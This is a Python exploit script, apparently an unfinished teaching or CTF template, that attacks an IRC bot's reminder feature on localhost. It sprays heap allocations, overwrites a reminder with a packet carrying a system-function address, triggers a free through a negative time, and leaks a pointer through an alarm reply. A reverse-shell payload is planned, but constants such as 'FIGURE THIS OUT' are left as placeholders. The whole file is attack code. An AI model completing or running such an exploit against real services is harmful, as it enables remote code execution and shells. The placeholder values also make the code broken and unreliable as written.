#! /usr/bin/python3
from socket import *
import time
import codecs
import random
import selectors
import sys
import struct

revshell = b'LOOK AT THE BOARD'
HOST = "127.0.0.1"
PORT = 6667
CHAN = b"#exploit"
KEYSTR = b":Okay! id "
REMINDERSZ = 0x38 - 1 - 1 # 0x38, with leading space and ending null
SYSTEMENTRY = "FIGURE THIS OUT"
SYSTEMPLT = "FIGURE THIS OUT"
GHELLO = "FIGURE THIS OUT"

REMINDEROFF_USER = 0x20 - 1
REMINDEROFF_ACTION = 0x30 - 1

def connectAndJoin(s, username):
    s.sendall(b'USER '+ username +b' +i unused pwn_cli\r\n')
    s.sendall(b'NICK '+ username +b'\r\n')
    s.sendall(b'JOIN '+ CHAN +b'\r\n')
    print(s.recv(0x1000))

def msgChan(s, msg):
    msg = b'PRIVMSG '+ CHAN +b' :'+ msg +b'\r\n'
    s.sendall(msg)
    print(b'Sent: '+msg)
    time.sleep(0.2)

def getID(s):
    id = 0
    while True:
        resp = s.recv(0x1000)
        print(resp)
        i = resp.find(KEYSTR)
        if i != -1:
            i += len(KEYSTR)
            id = resp[i:].split()[0]
            break
    return id


def main():
    s = socket(AF_INET, SOCK_STREAM, 0);

    s.connect((HOST, PORT))
    username = b"pwnr_" + codecs.encode(str(random.randint(0,1000)), 'ascii')
    connectAndJoin(s, username)

    # create the bot
    s.sendall(b'BOT bot3 exploitable ' + CHAN + b' :' + revshell + b'\r\n')
    time.sleep(1)
    
    for i in range(8):
        msgChan(s, b"remindMe! 9999999 " + (b"D" * REMINDERSZ))
        getID(s)

    ## allocate
    packet = b""
    packet += b"A" * REMINDEROFF_USER
    packet += struct.pack("<Q", SYSTEMENTRY)
    packet += b"B" * 8 #msg
    packet += b"C" * 8 #action

    packet = packet[:REMINDERSZ]

    if len(packet) != REMINDERSZ:
        print("ERROR size is wrong")
        exit()

    ## replace nulls for now
    packet = packet.replace(b'\0', b'*')
    
    msgChan(s, b"remindMe! 9999999 " + packet)
    theid = getID(s)
    print(b"Id" + theid)

    ## edit the nulls in
    while True:
        i = packet.rfind(b"*")
        print(i)
        if i == -1:
            break
        packet = packet[:i] + b'\0' + packet[i+1:]
    
        msgChan(s, b"remindEdit! "+ theid + b" msg= "+packet)
        getID(s)

    ##free target
    msgChan(s, b"remindEdit! "+ theid + b" time= -1")
    getID(s)

    ## leak with user for alarm
    time.sleep(2.0)
    
    msgChan(s, b"remindStart!")
    getID(s)

    msgChan(s, b"remindStart!")
    theid2 = getID(s)

    msgChan(s, b"remindStart!")
    getID(s)

    msgChan(s, b"remindEdit! "+ theid2 + b" type=alarm time=9999")
    getID(s)

    ## get the peek
    msgChan(s, b"remindInfo! "+ theid2)
    ## read the response
    resp = s.recv(1024)
    key = b"Alarm for "
    i = resp.find(key)
    if i == -1:
        print("Didn't find peek")
        exit(-1)

    i += len(key)
    print(len(resp[i:]))

    peeked = struct.unpack("<Q", resp[i:i+8])[0]
    peeked = peeked & 0xffffffffffff

    peeked = SYSTEMPLT
    print("peeked = ", hex(peeked))

